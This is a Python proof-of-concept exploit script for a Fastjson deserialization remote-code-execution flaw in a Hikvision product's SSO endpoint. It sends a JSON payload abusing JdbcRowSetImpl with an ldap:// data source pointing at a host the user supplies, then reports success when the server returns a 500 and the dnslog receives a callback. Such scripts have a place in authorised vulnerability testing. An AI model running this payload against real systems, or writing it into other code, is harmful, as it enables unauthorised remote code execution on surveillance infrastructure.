#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
@Project ：Poc_Hikvision_Fastjson.py 
@File    ：Poc2.py
@IDE     ：PyCharm 
@Author  ：0x95
@Date    ：12/2/2022 2:27 AM 
'''
import argparse
import getopt
import os.path
import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate",
    "Dnt": "1",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-User": "?1",
    "Te": "trailers",
    "Connection": "close",
    "Content-Type": "application/json"
}

def Poc(url,ldap):
    url = f"{url}/bic/ssoService/v1/applyCT"
    payload_json = {
        "a": {
            "@type": "java.lang.Class",
            "val": "com.sun.rowset.JdbcRowSetImpl"},
        "b": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://" + ldap,
            "autoCommit": True,
              },
        "hfe4zyyzldp": "="
    }
    try:
        req = requests.post(url,headers=header,json=payload_json,verify=False)
        if(req.status_code == 500):
            print('Done.View your Dnslog.')
        else:
            print('Failed.Maybe not a vuln')
    except Exception as e:
        print('Please check your url and dnslog.')
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.description = 'eg.python3 Poc.py -u http://127.0.0.1 -d xxx.dnslog.cn'
    parser.add_argument("-u", "--url", help="example:http://127.0.0.1", dest="argA", type=str, default=0)
    parser.add_argument("-d", "--dnslog", help="example:xxx.dnslog.cn", dest="argB", type=str, default=0)
    args = parser.parse_args()

    url = args.argA
    ldap = args.argB


    if(url == 0) & (ldap == 0):
        print('usage:Poc.py -h [-u] [-d]')
        print('eg.python3 Poc.py -u http://127.0.0.1 -d xxx.dnslog.cn')
        exit()
    print('----Hikvision Fastjson RCE Poc----\n')
    Poc(url,ldap)

    # url = input("Plz input url:")
    # ldap = input("Plz input ldap://")
    # Poc(url,ldap)
